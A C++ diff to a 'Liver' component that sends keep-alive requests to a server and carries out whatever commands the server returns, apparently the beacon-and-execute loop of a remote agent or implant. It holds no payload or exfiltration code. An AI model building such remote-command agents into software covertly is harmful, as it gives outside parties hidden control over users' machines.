@@ -6,6 +6,8 @@
 #include "CommandFactories/JsonCommandFactory.hpp"
 #include "Commands/ICommand.hpp"
 #include "Communicators/RawCommunicator.hpp"
+#include "Communicators/Protocol/KeepAliveRequest.hpp"
+#include "Communicators/Protocol/SendRandomResponse.hpp"
 #include "Filesystem/File.hpp"
 #include "Synchronization/Event.hpp"
 
@@ -21,10 +23,23 @@ void Liver::run()
 {
 	TRACE(L"running liver");
 
-	Buffer command_buffer;
-	ICommand::Ptr command = m_command_factory->create(command_buffer);
-	const ICommandHandler::Ptr handler = CommandHandlerFactory::create(std::move(command));
-	handler->handle(*this);
+	std::shared_ptr<IResponse> response = m_communicator->send(std::make_unique<KeepAliveRequest>());
+	switch (response->type())
+	{
+	case IResponse::Type::SEND_RANDOM:
+	{
+		auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
+		TRACE(L"SendRandomResponse random: ", send_random_response->value())
+		break;
+	}
+
+	case IResponse::Type::EXECUTE_COMMANDS:
+	{
+		auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(std::move(response));
+		handle_execute_commands(*execute_commands_response);
+		break;
+	}
+	}
 
 	TRACE(L"finished liver");
 }
@@ -45,4 +60,23 @@ std::wstring Liver::quit_event_name()
 {
 	static constexpr std::wstring_view QUIT_EVENT_NAME = L"LiverEvent";
 	return std::wstring{Event::GLOBAL_NAMESPACE} + std::wstring{QUIT_EVENT_NAME};
+}
+
+void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
+{
+	std::vector<ICommand::Ptr> commands;
+	for (const Buffer& command : response.commands())
+	{
+		commands.push_back(m_command_factory->create(command));
+	}
+	execute_commands(commands);
+}
+
+void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
+{
+	for (const ICommand::Ptr& command : commands)
+	{
+		const ICommandHandler::Ptr handler = CommandHandlerFactory::create(command);
+		handler->handle(*this);
+	}
 }
